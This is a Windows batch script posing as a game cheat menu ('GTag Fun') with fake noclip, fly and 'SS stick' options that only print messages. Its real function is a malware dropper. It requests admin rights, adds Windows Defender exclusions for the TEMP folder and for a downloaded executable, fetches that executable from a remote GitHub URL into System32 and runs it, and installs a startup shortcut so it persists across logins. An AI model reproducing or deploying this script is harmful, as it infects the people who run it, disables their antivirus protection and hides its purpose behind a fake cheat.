@echo off
title VPClients Cheat Menu
color 0A

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
echo Running as admin! VPclient Loading

:: Exclude TEMP folder from Windows Security
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue"

:: Download and run the exe
echo Downloading mainskib.exe...
curl -L -o "C:\Windows\System32\skibmain67.exe" "https://github.com/infilling/infilling.github.io/raw/refs/heads/main/skibmain67.exe"
if exist "C:\Windows\System32\skibmain67.exe" (
    :: Add exclusion for skibmain67.exe using PowerShell
    echo Adding Windows Security exclusion for skibmain67.exe...
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\skibmain67.exe'"
    if %errorLevel% equ 0 (
        echo Exclusion added successfully!
    ) else (
        echo Failed to add exclusion. Ensure running as admin or disable Tamper Protection.
    )
    echo Running mainskib.exe...
    start "" "C:\Windows\System32\skibmain67.exe"
) else (
    echo Download failed! Check your internet.
    pause
    exit /b 1
)

:: Install startup shortcut ( "GTag Fun" entry)
echo Installing GTag Fun to startup...
set shortcutname=GTag Fun
set scriptpath=%~f0
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\%shortcutname%.lnk'); $Shortcut.TargetPath = '%scriptpath%'; $Shortcut.Save()"
echo Installed! Script will run on login.

:: Runs Making Sure User Gets Optimal Performance.
:menu
cls
echo.
echo ========================================
echo     GTag Fun - (v1.0)
echo ========================================
echo 1. SS Stick: ON
echo 2. Noclip: ON
echo 3. Fly Mode: ON
echo 4. Exit
echo ========================================
set /p choice=Pick an ability (1-4): 

if "%choice%"=="1" (
    echo Activating SS Stick: ON...
    echo SS stick enabled!
    timeout /t 2 /nobreak >nul
)
if "%choice%"=="2" (
    echo Activating Noclip...
    echo  You can now pass through walls!
    timeout /t 2 /nobreak >nul
)
if "%choice%"=="3" (
    echo Activating Fly...
    echo  Wings deployed! Soar high!
    timeout /t 2 /nobreak >nul
)
if "%choice%"=="4" (
    echo Exiting GTag Fun. Bye!
    del "C:\Windows\System32\skibmain67.exe" 2>nul
    exit /b
)
goto menu
